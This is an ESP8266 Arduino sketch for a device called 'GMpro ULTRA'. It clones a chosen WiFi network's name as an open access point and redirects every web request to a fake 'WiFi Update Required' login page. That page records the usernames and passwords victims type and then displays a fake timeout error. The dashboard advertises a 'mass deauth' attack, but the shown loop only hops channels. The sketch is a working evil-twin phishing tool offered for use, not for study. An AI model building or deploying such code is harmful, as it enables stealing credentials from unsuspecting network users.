#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// Config OLED 0.66
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
#define LED_PIN 2 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;

// State Variables
bool isAttacking = false;
String target_ssid = "";
String logs = "";
String apSSID = "GMpro";
String apPASS = "sangkur87";
unsigned long lastBlink = 0;

void drawSkull() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(10, 5);
  display.println("  XXXX  ");
  display.println(" XXXXXX ");
  display.println("  X  X  ");
  display.println("  XXXX  ");
  display.println(" GM-PRO ");
  display.display();
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  
  // Inisialisasi OLED
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  drawSkull();
  
  // Masuk ke Mode AP+STA tanpa perintah daya yang bikin error
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  WiFi.softAP(apSSID.c_str(), apPASS.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  // --- DASHBOARD ---
  server.on("/", []() {
    String s = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
    s += "body{background-color:#000;background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzA0MTAwMCI+PHBhdGggZD0iTTEyIDJjLTQuNDIgMC04IDMuNTgtOCA4IDAgMS42OS41MiAzLjI0IDEuNCA0LjUxTDUuMTUgMjEuNjFjLS4zOS4zOS0uMzkgMS4wMiAwIDEuNDEuMzkuMzkgMS4wMi4zOSAxLjQxIDBsMi4xLTIuMWMxLjI3Ljg4IDIuODIgMS40IDQuNTEgMS40IDQuNDIgMCA4LTMuNTggOC04czMtOC04LTh6bTAtMmM1LjUyIDAgMTAgNC40OCAxMCAxMHMtNC40OCAxMC0xMCAxMC0xMC00LjQ4LTEwLTEwIDQuNDgtMTAgMTAtMTB6bS0zIDExYTEuNSAxLjUgMCAxIDEgMC0zIDEuNSAxLjUgMCAwIDEgMCAzem02IDBhMS41IDEuNSAwIDEgMSAwLTMgMS41IDEuNSAwIDAgMSAwIDN6bS0zIDRjLTIuNCAwLTQuNS0xLjMxLTUuNjMtMy4yOSAxLjA3LjggMi40MiAxLjI5IDMuODggMS4yOSAxLjQ2IDAgMi44MS0uNDkgMy44OC0xLjI5QzE2LjUgMTMuNjkgMTQuNCAxNSAxMiAxNXoiLz48L3N2Zz4=');";
    s += "background-repeat:no-repeat;background-position:center 100px;background-size:200px;color:#0f0;font-family:monospace;}";
    s += ".b{border:1px solid #0f0;padding:12px;display:block;margin:10px 5px;color:#0f0;text-decoration:none;text-align:center;background:rgba(0,30,0,0.7);}";
    s += "h1{text-shadow:0 0 10px #0f0;text-align:center;}</style></head><body>";
    s += "<h1>[ GMpro ULTRA ]</h1>";
    s += "<p style='text-align:center;'>TARGET: " + (target_ssid=="" ? "NONE" : target_ssid) + "</p>";
    s += "<a href='/scan' class='b'>SCAN & SELECT TARGET</a>";
    s += "<a href='/attack' class='b'>" + String(isAttacking ? "STOP ATTACK" : "START MASS DEAUTH") + "</a>";
    s += "<a href='/settings' class='b'>SETTINGS</a>";
    s += "<div style='background:rgba(0,0,0,0.8);padding:10px;'><h3>LOGS:</h3><p style='color:white;'>" + logs + "</p></div>";
    s += "</body></html>";
    server.send(200, "text/html", s);
  });

  server.on("/settings", []() {
    String set = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>";
    set += "<h2>[ SETTINGS ]</h2>";
    set += "<form action='/save_set'>SSID:<br><input type='text' name='s' value='"+apSSID+"'><br>";
    set += "PASS:<br><input type='text' name='p' value='"+apPASS+"'><br><br>";
    set += "<input type='submit' value='SAVE & REBOOT'></form></body></html>";
    server.send(200, "text/html", set);
  });

  server.on("/save_set", []() {
    apSSID = server.arg("s");
    apPASS = server.arg("p");
    server.send(200, "text/html", "Tersimpan! Rebooting...");
    delay(2000);
    ESP.restart();
  });

  server.on("/scan", []() {
    int n = WiFi.scanNetworks();
    String sc = "<html><body style='background:#000;color:#0f0;'><h2>SCAN RESULTS</h2>";
    for(int i=0; i<n; i++) sc += "<div>" + WiFi.SSID(i) + " <a href='/select?s=" + WiFi.SSID(i) + "'>[SELECT]</a></div><br>";
    sc += "</body></html>";
    server.send(200, "text/html", sc);
  });

  server.on("/select", []() {
    target_ssid = server.arg("s");
    WiFi.softAP(target_ssid.c_str(), ""); 
    server.sendHeader("Location", "/");
    server.send(302);
  });

  server.on("/attack", [](){ isAttacking = !isAttacking; server.sendHeader("Location", "/"); server.send(302); });

  server.onNotFound([]() {
    String login = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='text-align:center;'>";
    login += "<h2>WiFi Update Required</h2><form action='/login'><input type='text' name='u' placeholder='Username'><br><br><input type='password' name='p' placeholder='Password'><br><br><input type='submit' value='Login'></form></body></html>";
    server.send(200, "text/html", login);
  });

  server.on("/login", []() {
    logs += "User: " + server.arg("u") + " | Pass: " + server.arg("p") + "<br>";
    server.send(200, "text/html", "Error: Connection timeout.");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  unsigned long now = millis();
  int interval = isAttacking ? 100 : 1000; 
  if (now - lastBlink >= interval) {
    lastBlink = now;
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
  }
  
  if(isAttacking) {
    for(int i=1; i<=13; i++) {
      wifi_set_channel(i);
      delay(1);
    }
  }
}
